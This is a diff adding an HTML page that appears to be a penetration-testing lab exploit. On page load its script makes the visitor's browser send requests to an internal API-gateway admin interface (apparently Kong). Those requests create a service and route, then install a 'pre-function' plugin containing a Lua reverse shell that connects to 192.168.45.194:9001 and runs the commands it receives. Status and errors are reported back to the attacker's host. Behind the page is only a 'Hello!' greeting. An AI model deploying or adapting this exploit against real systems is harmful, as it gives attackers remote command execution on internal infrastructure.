@@ -1,0 +1,56 @@
+<html>
+
+<head>
+<script>
+let LHOST = "192.168.45.194";
+
+function createService() {
+ fetch("http://172.16.16.2:8001/services", {
+ method: "post",
+ headers: { "Content-Type": "application/json" },
+ body: JSON.stringify({"name":"supersecret", "url": "http://127.0.0.1/"})
+ }).then(function (route) {
+ createRoute();
+ }).then(function (callback) {
+ 	fetch("http://" + LHOST + "/callback?data=ServiceCreated");
+ 	return "ok"
+ }).catch((err) => {
+ 	fetch("http://" + LHOST + "/error?data=" + encodeURIComponent(err));
+ });
+}
+
+function createRoute() {
+ fetch("http://172.16.16.2:8001/services/supersecret/routes", { 
+ method: "post",
+ headers: { "Content-Type": "application/json" },
+ body: JSON.stringify({"paths": ["/supersecret"]})
+ }).then(function (plugin) {
+ createPlugin();
+ }).then(function (callback) {
+ fetch("http://"+ LHOST+"/callback?data=RouteCreated");
+ 	return "ok";
+ }).catch((err) => {
+ 	fetch("http://" + LHOST + "/error?data=" + encodeURIComponent(err));
+ });
+}
+
+function createPlugin() {
+ fetch("http://172.16.16.2:8001/services/supersecret/plugins", { 
+ method: "post",
+ headers: { "Content-Type": "application/json" },
+ body: JSON.stringify({"name":"pre-function", "config" :{ "access" :["local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.194',9001);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"]}})
+ }).then(function (callback) {
+ fetch("http://"+LHOST+"/callback?data=setupComplete");
+ }).catch((err) => {
+ 	fetch("http://" + LHOST + "/error?data=" + encodeURIComponent(err));
+ });
+}
+
+</script>
+<body onload='createService()'>
+<p> Hello! </p>
+</body>
+</head>
+
+
+</html>
